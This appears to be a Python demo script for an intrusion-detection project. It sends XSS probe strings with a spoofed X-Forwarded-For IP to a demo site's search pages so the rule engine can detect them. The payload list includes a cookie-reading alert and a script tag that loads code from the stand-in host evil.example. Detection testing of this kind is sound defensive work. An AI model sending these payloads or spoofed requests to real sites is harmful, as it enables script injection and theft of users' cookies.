#!/usr/bin/env python3
"""Simulates XSS payload probing against the Library and Results
search pages.

Real HTTP requests only. Jinja2 (Flask's template engine) autoescapes
these payloads when echoing a search term back into the page, so
nothing actually executes in a browser -- this demonstrates detection
of the request pattern, not a working exploit against the demo site.

Verified against the actual, unmodified rule engine: there is no
distinct "XSS" category. The classifier's injection branch matches on
'script' and '<svg' as substrings, so these payloads are classified as
"SQL/Web Injection Attack", the same as the SQLi demo. This is
reported exactly as it behaves in docs/DEMO_GUIDE.md, not relabeled.

Usage:
    python demo/simulate_xss.py [--interval 0.3]
"""
import argparse
import time

from _common import BASE_URL, check_site_is_running, spoofed_session

PAYLOADS = [
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:alert(1)",
    "<script src=//evil.example/x.js></script>",
]


def run(interval: float, ip: str):
    session = spoofed_session(ip)
    for payload in PAYLOADS:
        resp = session.get(BASE_URL + "/library", params={"q": payload})
        print(f"/library?q={payload!r} -> {resp.status_code}")
        time.sleep(interval)
    for payload in PAYLOADS:
        resp = session.get(BASE_URL + "/results", params={"roll_no": payload})
        print(f"/results?roll_no={payload!r} -> {resp.status_code}")
        time.sleep(interval)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--interval", type=float, default=0.3)
    parser.add_argument("--ip", default="203.0.113.60", help="Simulated attacker IP (via X-Forwarded-For)")
    args = parser.parse_args()

    check_site_is_running()
    run(args.interval, args.ip)
